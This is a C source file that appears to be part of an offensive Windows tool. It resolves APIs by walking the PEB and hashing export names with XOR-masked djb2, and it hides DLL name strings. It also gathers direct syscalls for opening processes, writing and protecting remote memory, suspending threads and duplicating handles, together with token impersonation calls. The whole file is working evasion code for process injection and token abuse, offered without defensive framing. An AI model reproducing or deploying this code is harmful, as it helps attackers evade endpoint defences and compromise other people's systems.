#include "apiresolve.h"

BOOL ResolveApi(PAPI pApi) {

	BOOL bSuccess = FALSE;

	pApi->Kernel32.lstrcatA = GetFunctionPtr(H_LIB_KERNEL32, H_API_LSTRCATA); if (pApi->Kernel32.lstrcatA == NULL) goto exit;
	pApi->Kernel32.lstrcmpA = GetFunctionPtr(H_LIB_KERNEL32, H_API_LSTRCMPA); if (pApi->Kernel32.lstrcmpA == NULL) goto exit;
	pApi->Kernel32.lstrcmpW = GetFunctionPtr(H_LIB_KERNEL32, H_API_LSTRCMPW); if (pApi->Kernel32.lstrcmpW == NULL) goto exit;
	pApi->Kernel32.CreateToolhelp32Snapshot = GetFunctionPtr(H_LIB_KERNEL32, H_API_CREATETOOLHELP32SNAPSHOT); if (pApi->Kernel32.CreateToolhelp32Snapshot == NULL) goto exit;
	pApi->Kernel32.Process32First = GetFunctionPtr(H_LIB_KERNEL32, H_API_PROCESS32FIRST); if (pApi->Kernel32.Process32First == NULL) goto exit;
	pApi->Kernel32.Process32Next = GetFunctionPtr(H_LIB_KERNEL32, H_API_PROCESS32NEXT); if (pApi->Kernel32.Process32Next == NULL) goto exit;
	pApi->Kernel32.CloseHandle = GetFunctionPtr(H_LIB_KERNEL32, H_API_CLOSEHANDLE); if (pApi->Kernel32.CloseHandle == NULL) goto exit;
	pApi->Kernel32.VirtualAlloc = GetFunctionPtr(H_LIB_KERNEL32, H_API_VIRTUALALLOC); if (pApi->Kernel32.VirtualAlloc == NULL) goto exit;
	pApi->Kernel32.VirtualFree = GetFunctionPtr(H_LIB_KERNEL32, H_API_VIRTUALFREE); if (pApi->Kernel32.VirtualFree == NULL) goto exit;
	pApi->Kernel32.GetModuleHandleA = GetFunctionPtr(H_LIB_KERNEL32, H_API_GETMODULEHANDLEA); if (pApi->Kernel32.GetModuleHandleA == NULL) goto exit;
	pApi->Kernel32._CopyMemory = GetFunctionPtr(H_LIB_KERNEL32, H_API_COPYMEMORY); if (pApi->Kernel32._CopyMemory == NULL) goto exit;

	pApi->Psapi.GetModuleFileNameExA = GetFunctionPtr(H_LIB_PSAPI, H_API_GETMODULEFILENAMEEXA); if (pApi->Psapi.GetModuleFileNameExA == NULL) goto exit;
	pApi->Psapi.EnumProcessModules = GetFunctionPtr(H_LIB_PSAPI, H_API_ENUMPROCESSMODULES); if (pApi->Psapi.EnumProcessModules == NULL) goto exit;

	pApi->Advapi32.ImpersonateLoggedonUser = GetFunctionPtr(H_LIB_ADVAPI32, H_API_IMPERSONATELOGGEDONUSER); if (pApi->Advapi32.ImpersonateLoggedonUser == NULL) goto exit;
	pApi->Advapi32.GetTokenInformation = GetFunctionPtr(H_LIB_ADVAPI32, H_API_GETTOKENINFORMATION); if (pApi->Advapi32.GetTokenInformation == NULL) goto exit;
	pApi->Advapi32.LookupAccountSidA = GetFunctionPtr(H_LIB_ADVAPI32, H_API_LOOKUPACCOUNTSIDA); if (pApi->Advapi32.LookupAccountSidA == NULL) goto exit;

	bSuccess = GetSyscall(H_API_NTOPENPROCESS, &pApi->Nt.NtOpenProcess); if (bSuccess == FALSE) goto exit;
	bSuccess = GetSyscall(H_API_NTOPENPROCESSTOKEN, &pApi->Nt.NtOpenProcessToken); if (bSuccess == FALSE) goto exit;
	bSuccess = GetSyscall(H_API_NTOPENTHREAD, &pApi->Nt.NtOpenThread); if (bSuccess == FALSE) goto exit;
	bSuccess = GetSyscall(H_API_NTRESUMETHREAD, &pApi->Nt.NtResumeThread); if (bSuccess == FALSE) goto exit;
	bSuccess = GetSyscall(H_API_NTSUSPENDTHREAD, &pApi->Nt.NtSuspendThread); if (bSuccess == FALSE) goto exit;
	bSuccess = GetSyscall(H_API_NTQUERYSYSTEMINFORMATION, &pApi->Nt.NtQuerySystemInformation); if (bSuccess == FALSE) goto exit;
	bSuccess = GetSyscall(H_API_NTDUPLICATEOBJECT, &pApi->Nt.NtDuplicateObject); if (bSuccess == FALSE) goto exit;
	bSuccess = GetSyscall(H_API_NTALLOCATEVIRTUALMEMORY, &pApi->Nt.NtAllocateVirtualMemory); if (bSuccess == FALSE) goto exit;
	bSuccess = GetSyscall(H_API_NTWRITEVIRTUALMEMORY, &pApi->Nt.NtWriteVirtualMemory); if (bSuccess == FALSE) goto exit;
	bSuccess = GetSyscall(H_API_NTPROTECTVIRTUALMEMORY, &pApi->Nt.NtProtectVirtualMemory); if (bSuccess == FALSE) goto exit;

exit:

	return bSuccess;

}

PVOID
GetFunctionPtr(unsigned long crypted_dll_hash, unsigned long crypted_function_hash) {

	PVOID dll_base = 0x00;
	PVOID ptr_function = 0x00;

	dll_base = getDllBase(crypted_dll_hash);
	if (dll_base == 0) {
		dll_base = loadDll(crypted_dll_hash);
		if (dll_base == 0)
			return 0;
	}

	ptr_function = parseHdrForPtr(dll_base, crypted_function_hash);

	return ptr_function;

}

PVOID
loadDll(unsigned long crypted_dll_hash) {

	PVOID pKernel32 = 0x00;
	PVOID pLoadLibrary = 0x00;
	PVOID pDllBase = 0x00;

	pKernel32 = getDllBase(H_LIB_KERNEL32);
	if (pKernel32 == NULL)
		return NULL;

	pLoadLibrary = parseHdrForPtr(pKernel32, H_API_LOADLIBRARYA);
	if (pLoadLibrary == NULL)
		return NULL;
	
	if (crypted_dll_hash == H_LIB_ADVAPI32) {
		char dll_name[] = { 'A', 'd', 'v', 'a', 'p', 'i', '3', '2','.','d','l','l',0x00, 0x00, 0x00, 0x00 };
		pDllBase = (PVOID)((LOADLIBRARYA)pLoadLibrary)(dll_name);
	} else if (crypted_dll_hash == H_LIB_PSAPI) {
		char dll_name[] = { 'P', 's', 'a', 'p', 'i', '.', 'd','l','l',0x00 };
		pDllBase = (PVOID)((LOADLIBRARYA)pLoadLibrary)(dll_name);
	} else if (crypted_dll_hash == H_LIB_SHLWAPI) {
		char dll_name[] = { 'S', 'h', 'l', 'w', 'a', 'p', 'i', '.', 'd','l','l',0x00 };
		pDllBase = (PVOID)((LOADLIBRARYA)pLoadLibrary)(dll_name);

	}
	 
	return pDllBase;

}

PVOID
loadDll_byName(PSTR dll_name) {

	PVOID pBaseKernel32 = NULL,	pLoadLibrary = NULL, pLoadedDll = 0x00;

	pBaseKernel32 = getDllBase(H_LIB_KERNEL32);
	if (pBaseKernel32 == 0x00)
		return NULL;

	pLoadLibrary = parseHdrForPtr(pBaseKernel32, H_API_LOADLIBRARYA);
	if (pLoadLibrary == 0x00)
		return NULL;

	pLoadedDll = (PVOID)((LOADLIBRARYA)pLoadLibrary)(dll_name);

	return pLoadedDll;

}


PVOID
parseHdrForPtr(PBYTE dll_base, unsigned long crypted_function_hash) {

	PIMAGE_NT_HEADERS ntHdrs = NULL;
	PIMAGE_DATA_DIRECTORY dataDir = NULL;
	PIMAGE_EXPORT_DIRECTORY exportDir = NULL;

	PDWORD pExportTable = NULL, pNamePointerTable = NULL;
	PWORD pOrdinalTable = NULL;
	DWORD idxFunctions = 0;

	LPSTR pFunctionName = NULL;

	ntHdrs = (PIMAGE_NT_HEADERS)(dll_base + ((PIMAGE_DOS_HEADER)(size_t)dll_base)->e_lfanew);
	dataDir = (PIMAGE_DATA_DIRECTORY)&ntHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
	exportDir = (PIMAGE_EXPORT_DIRECTORY)(dll_base + dataDir->VirtualAddress);

	pExportTable = (PDWORD)(dll_base + exportDir->AddressOfFunctions);
	pNamePointerTable = (PDWORD)(dll_base + exportDir->AddressOfNames);
	pOrdinalTable = (WORD*)(dll_base + exportDir->AddressOfNameOrdinals);

	for (idxFunctions = 0; idxFunctions < exportDir->NumberOfNames; idxFunctions++) {

		pFunctionName = (LPSTR)dll_base + (pNamePointerTable[idxFunctions]);
		if (djb2(pFunctionName) == xorHash(crypted_function_hash)) {

			WORD nameord = pOrdinalTable[idxFunctions];
			DWORD rva = pExportTable[nameord];

			if (dll_base + rva >= dll_base + dataDir->VirtualAddress && dll_base + rva <= dll_base + dataDir->VirtualAddress + dataDir->Size) {
				// This is a forwarded export 
				PSTR pForward = (PSTR)(dll_base + rva);
				return followExport(pForward, crypted_function_hash);
			}


			return dll_base + rva;
		}

	}

	return 0;
}

PVOID followExport(PSTR ptr_forward, unsigned long crypted_function_hash) {

	STRSTRA _StrStrA = (STRSTRA)GetFunctionPtr(H_LIB_SHLWAPI, H_API_STRSTRA);

	if (_StrStrA == 0x00)
		return 0;

	char del[] = { '.', 0x00 };
	char* pos_del = 0x00;
	char forward_dll[MAX_PATH] = { 0 };
	char forward_export[MAX_PATH] = { 0 };
	unsigned long forward_export_hash = 0x00;
	BYTE i = 0;
	PVOID fwd_dll_base = 0x00, forwarded_export = 0x00;

	while (*ptr_forward)
		forward_dll[i++] = *ptr_forward++;

	pos_del = (char*)_StrStrA(forward_dll, del);
	if (pos_del == 0)
		return 0;

	*(char*)(pos_del++) = 0x00;
	i = 0;
	while (*pos_del)
		forward_export[i++] = *pos_del++;

	forward_export_hash = xorHash(djb2((PCSTR)forward_export));

	fwd_dll_base = getDllBase(xorHash(djb2((PCSTR)forward_dll)));
	if (fwd_dll_base == 0x00) {
		fwd_dll_base = loadDll_byName(forward_dll);
		if (fwd_dll_base == 0x00)
			return 0;
	}

	forwarded_export = parseHdrForPtr(fwd_dll_base, forward_export_hash);

	return forwarded_export;

}



PVOID
getDllBase(unsigned long crypted_dll_hash) {

	PPEB pPeb = NULL;
	PPEB_LDR_DATA pLdrData = NULL;
	PLDR_DATA_TABLE_ENTRY pModuleEntry = NULL, pStartModule = NULL;
	PUNICODE_STR dll_name = NULL;

	pPeb = (PPEB)__readgsqword(0x60);
	pLdrData = pPeb->pLdr;
	pModuleEntry = pStartModule = (PLDR_DATA_TABLE_ENTRY)pLdrData->InMemoryOrderModuleList.Flink;

	do {

		dll_name = &pModuleEntry->BaseDllName;

		if (dll_name->pBuffer == NULL)
			return 0;

		if (djb2_unicode(toLowerW(dll_name->pBuffer)) == xorHash(crypted_dll_hash))
			return (PVOID)pModuleEntry->DllBase;

		pModuleEntry = (PLDR_DATA_TABLE_ENTRY)pModuleEntry->InMemoryOrderModuleList.Flink;

	} while (pModuleEntry != pStartModule);

	return 0;

}

unsigned long
xorHash(unsigned long hash) {
	return hash ^ 0x41424344;
}

